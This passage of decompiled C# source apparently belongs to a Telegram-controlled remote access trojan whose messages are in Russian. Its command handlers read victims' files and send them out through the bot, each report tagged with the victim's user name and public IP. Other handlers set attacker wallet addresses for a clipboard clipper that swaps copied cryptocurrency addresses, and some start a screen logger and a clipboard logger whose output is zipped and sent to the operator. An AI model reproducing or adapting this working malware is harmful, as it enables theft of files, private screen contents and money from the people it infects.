							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list64.Add(secondParser19);
				List<SecondParser> list65 = Commands.filemanager;
				SecondParser secondParser20 = new SecondParser();
				secondParser20.Command = "info";
				secondParser20.Example = "info [NameFileInFolder]";
				secondParser20.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (System.IO.File.Exists(path))
						{
							string text = Func.FileInfo(path);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								text
							}), false, 0, null, false);
						}
						else if (Directory.Exists(path))
						{
							string text2 = Func.DirInfo(path);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								text2
							}), false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанного предмета не существует ( ￣ー￣)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list65.Add(secondParser20);
				List<SecondParser> list66 = Commands.filemanager;
				SecondParser secondParser21 = new SecondParser();
				secondParser21.Command = "send";
				secondParser21.Example = "send [NameFileInFolder]";
				secondParser21.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (System.IO.File.Exists(path))
						{
							string ret = Func.Copy(path);
							string filename = Func.Name(path);
							FileStream content = System.IO.File.OpenRead(ret);
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend(filename, content), 0, null);
							System.IO.File.Delete(ret);
							ret = null;
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанный файл не существует (－‸ლ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list66.Add(secondParser21);
				List<SecondParser> list67 = Commands.filemanager;
				SecondParser secondParser22 = new SecondParser();
				secondParser22.Command = "read";
				secondParser22.Example = "read [NameFileInFolder]";
				secondParser22.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (System.IO.File.Exists(path))
						{
							string ret = Func.Copy(path);
							string text = System.IO.File.ReadAllText(ret);
							string value = "���";
							if (text.Contains(value))
							{
								string text2 = System.IO.File.ReadAllText(path, Encoding.GetEncoding("windows-1251"));
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
								{
									Environment.UserName,
									"/",
									Commands.pubIp,
									"\n",
									text2
								}), false, 0, null, false);
							}
							else
							{
								string text2 = System.IO.File.ReadAllText(path);
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
								{
									Environment.UserName,
									"/",
									Commands.pubIp,
									"\n",
									text2
								}), false, 0, null, false);
							}
							System.IO.File.Delete(ret);
							ret = null;
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанный файл не существует (－‸ლ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list67.Add(secondParser22);
				List<FirstParser> list68 = Commands.settings;
				FirstParser firstParser46 = new FirstParser();
				firstParser46.Command = "/SetQiwi";
				firstParser46.CountArgs = 1;
				firstParser46.Example = "/SetQiwi [wallet]";
				firstParser46.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.qiwi = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser46.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetQiwi", false, 0, null, false);
				};
				list68.Add(firstParser46);
				List<FirstParser> list69 = Commands.settings;
				FirstParser firstParser47 = new FirstParser();
				firstParser47.Command = "/SetWMR";
				firstParser47.CountArgs = 1;
				firstParser47.Example = "/SetWMR [wallet]";
				firstParser47.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.wmr = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser47.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetWMR", false, 0, null, false);
				};
				list69.Add(firstParser47);
				List<FirstParser> list70 = Commands.settings;
				FirstParser firstParser48 = new FirstParser();
				firstParser48.Command = "/SetWMZ";
				firstParser48.CountArgs = 1;
				firstParser48.Example = "/SetWMZ [wallet]";
				firstParser48.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.wmz = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser48.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetWMZ", false, 0, null, false);
				};
				list70.Add(firstParser48);
				List<FirstParser> list71 = Commands.settings;
				FirstParser firstParser49 = new FirstParser();
				firstParser49.Command = "/SetWME";
				firstParser49.CountArgs = 1;
				firstParser49.Example = "/SetWME [wallet]";
				firstParser49.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.wme = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser49.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetWME", false, 0, null, false);
				};
				list71.Add(firstParser49);
				List<FirstParser> list72 = Commands.settings;
				FirstParser firstParser50 = new FirstParser();
				firstParser50.Command = "/SetWMX";
				firstParser50.CountArgs = 1;
				firstParser50.Example = "/SetWMX [wallet]";
				firstParser50.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.wmx = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser50.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetWMX", false, 0, null, false);
				};
				list72.Add(firstParser50);
				List<FirstParser> list73 = Commands.settings;
				FirstParser firstParser51 = new FirstParser();
				firstParser51.Command = "/SetYandexMoney";
				firstParser51.CountArgs = 1;
				firstParser51.Example = "/SetYandexMoney [wallet]";
				firstParser51.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.yd = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser51.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetYandexMoney", false, 0, null, false);
				};
				list73.Add(firstParser51);
				List<FirstParser> list74 = Commands.settings;
				FirstParser firstParser52 = new FirstParser();
				firstParser52.Command = "/SetCC";
				firstParser52.CountArgs = 1;
				firstParser52.Example = "/SetCC [wallet]";
				firstParser52.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.cc = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser52.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetCC", false, 0, null, false);
				};
				list74.Add(firstParser52);
				List<FirstParser> list75 = Commands.settings;
				FirstParser firstParser53 = new FirstParser();
				firstParser53.Command = "/SetPayeer";
				firstParser53.CountArgs = 1;
				firstParser53.Example = "/SetPayeer [wallet]";
				firstParser53.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.payeer = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser53.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetPayeer", false, 0, null, false);
				};
				list75.Add(firstParser53);
				List<FirstParser> list76 = Commands.settings;
				FirstParser firstParser54 = new FirstParser();
				firstParser54.Command = "/SetRipple";
				firstParser54.CountArgs = 1;
				firstParser54.Example = "/SetRipple [wallet]";
				firstParser54.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.ripple = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser54.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetRipple", false, 0, null, false);
				};
				list76.Add(firstParser54);
				List<FirstParser> list77 = Commands.settings;
				FirstParser firstParser55 = new FirstParser();
				firstParser55.Command = "/SetDogechain";
				firstParser55.CountArgs = 1;
				firstParser55.Example = "/SetDogechain [wallet]";
				firstParser55.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.dogechain = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser55.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetDogechain", false, 0, null, false);
				};
				list77.Add(firstParser55);
				List<FirstParser> list78 = Commands.settings;
				FirstParser firstParser56 = new FirstParser();
				firstParser56.Command = "/SetTron";
				firstParser56.CountArgs = 1;
				firstParser56.Example = "/SetTron [wallet]";
				firstParser56.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.tron = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser56.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetTron", false, 0, null, false);
				};
				list78.Add(firstParser56);
				List<FirstParser> list79 = Commands.settings;
				FirstParser firstParser57 = new FirstParser();
				firstParser57.Command = "/SetBTCG";
				firstParser57.CountArgs = 1;
				firstParser57.Example = "/SetBTCG [wallet]";
				firstParser57.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.btcg = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser57.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetBTCG", false, 0, null, false);
				};
				list79.Add(firstParser57);
				List<FirstParser> list80 = Commands.settings;
				FirstParser firstParser58 = new FirstParser();
				firstParser58.Command = "/SetBTC";
				firstParser58.CountArgs = 1;
				firstParser58.Example = "/SetBTC [wallet]";
				firstParser58.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Purse.btc = model.Args.FirstOrDefault<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Назначено", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser58.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SetBTC", false, 0, null, false);
				};
				list80.Add(firstParser58);
				List<FirstParser> list81 = Commands.settings;
				FirstParser firstParser59 = new FirstParser();
				firstParser59.Command = "/wallets";
				firstParser59.CountArgs = 0;
				firstParser59.Example = "/wallets";
				firstParser59.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Листик кошельков (o˘◡˘o)\n\n/SetQiwi [wallet]\n/SetWMR [wallet]\n/SetWMZ [wallet]\n/SetWME [wallet]\n/SetWMX [wallet]\n/SetYandexMoney [wallet]\n/SetCC [wallet]\n/SetPayeer [wallet]\n/SetRipple [wallet]\n/SetDogechain [wallet]\n/SetTron [wallet]\n/SetBTCG [wallet]\n/SetBTC [wallet]", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser59.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /wallets", false, 0, null, false);
				};
				list81.Add(firstParser59);
				List<FirstParser> list82 = Commands.settings;
				FirstParser firstParser60 = new FirstParser();
				firstParser60.Command = "/SaveConfig";
				firstParser60.CountArgs = 0;
				firstParser60.Example = "/SaveConfig";
				firstParser60.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Create.CreateCfg();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nКонфиг для меня сохранён  人(_ _*)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser60.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SaveConfig", false, 0, null, false);
				};
				list82.Add(firstParser60);
				List<FirstParser> list83 = Commands.settings;
				FirstParser firstParser61 = new FirstParser();
				firstParser61.Command = "/StartScreenLogger";
				firstParser61.CountArgs = 0;
				firstParser61.Example = "/StartScreenLogger";
				firstParser61.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (!Commands.Scr)
						{
							Commands.Scr = true;
							ScrL.perm = true;
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСкринЛоггер запущен\n└(＾＾)┐ ┌(＾＾)┘", false, 0, null, false);
							ScrL.Time2Log();
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ тебя там альцгеймер?\nОн уже запущен", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser61.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /StartScreenLogger", false, 0, null, false);
				};
				list83.Add(firstParser61);
				List<FirstParser> list84 = Commands.settings;
				FirstParser firstParser62 = new FirstParser();
				firstParser62.Command = "/SendScreenshots";
				firstParser62.CountArgs = 0;
				firstParser62.Example = "/SendScreenshots";
				firstParser62.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Wait, false, 0, null, false);
						Archive.Zip(Commands.directory + "scr.zip", Folders.screenfolder).Wait();
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "scr.zip"))
						{
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("scr.zip", stream), 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "scr.zip");
						Directory.Delete(Folders.screenfolder, true);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser62.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /SendScreenshots", false, 0, null, false);
				};
				list84.Add(firstParser62);
				List<FirstParser> list85 = Commands.settings;
				FirstParser firstParser63 = new FirstParser();
				firstParser63.Command = "/StopScreenLogger";
				firstParser63.CountArgs = 0;
				firstParser63.Example = "/StopScreenLogger";
				firstParser63.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Commands.Scr)
						{
							ScrL.perm = false;
							Commands.Scr = false;
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Уже выключаю (͡° ͜ʖ ͡°)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Для начала нужно его запустить (ಠ_ಠ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser63.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /StopScreenLogger", false, 0, null, false);
				};
				list85.Add(firstParser63);
				List<FirstParser> list86 = Commands.settings;
				FirstParser firstParser64 = new FirstParser();
				firstParser64.Command = "/ClipperStart";
				firstParser64.CountArgs = 0;
				firstParser64.Example = "/ClipperStart";
				firstParser64.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (!Commands.Clp)
						{
							Commands.Clp = true;
							ClipChanger.StartChanger();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nКлиппер запустился во мне (⁄ ⁄•⁄ω⁄•⁄ ⁄)", false, 0, null, false);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЯ получил власть которая и не снилась моему отцу\n٩(╬ʘ益ʘ╬)۶", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nБро, он уже работает (－‸ლ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser64.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /ClipperStart", false, 0, null, false);
				};
				list86.Add(firstParser64);
				List<FirstParser> list87 = Commands.settings;
				FirstParser firstParser65 = new FirstParser();
				firstParser65.Command = "/ClipperStop";
				firstParser65.CountArgs = 0;
				firstParser65.Example = "/ClipperStop";
				firstParser65.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Commands.Clp)
						{
							Commands.Clp = false;
							ClipChanger.StopChanger();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТак и быть, выключу (⇀‸↼‶)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСначала нужно его включить (・_・ )", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser65.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /ClipperStop", false, 0, null, false);
				};
				list87.Add(firstParser65);
				List<FirstParser> list88 = Commands.settings;
				FirstParser firstParser66 = new FirstParser();
				firstParser66.Command = "/ClipboardLoggerStart";
				firstParser66.CountArgs = 0;
				firstParser66.Example = "/ClipboardLoggerStart";
				firstParser66.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (!Commands.Cbl)
						{
							Commands.Cbl = true;
							ClipChanger.StartLogger();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nБыл запущен! (⌒ω⌒)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nОн уже работает (; ・_・)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser66.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /ClipboardLoggerStart", false, 0, null, false);
				};
				list88.Add(firstParser66);
				List<FirstParser> list89 = Commands.settings;
				FirstParser firstParser67 = new FirstParser();
				firstParser67.Command = "/ClipboardLoggerSend";
				firstParser67.CountArgs = 0;
				firstParser67.Example = "/ClipboardLoggerSend";
				firstParser67.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (System.IO.File.Exists(Commands.directory + "Log_ClipBoard.txt"))
						{
							using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "Log_ClipBoard.txt"))
							{
								await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Log_ClipBoard.txt", stream), 0, null);
							}
							FileStream stream = null;
